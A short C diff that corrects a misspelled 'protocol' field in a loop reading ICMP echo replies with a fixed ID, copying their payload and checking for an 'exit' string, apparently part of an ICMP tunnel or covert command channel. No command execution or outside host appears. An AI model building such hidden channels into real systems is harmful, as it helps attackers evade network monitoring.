@@ -60,7 +60,7 @@ void start_pipe(char *buf,int len)
   while(1)
   {
     i=recv(lsock,buf,512,0);
-      if(ip->potocol == 1 && icmp->type == 0 && ntohs(icmp->un.echo.id) == RID) {
+      if(ip->protocol == 1 && icmp->type == 0 && ntohs(icmp->un.echo.id) == RID) {
         p=(buf+sizeof(struct iphdr)+sizeof(struct icmphdr));
         memcpy(databuf,p,i-(sizeof(struct iphdr)+sizeof(struct icmphdr))+1);
           if(strcasecmp(databuf,"exit") == 0)
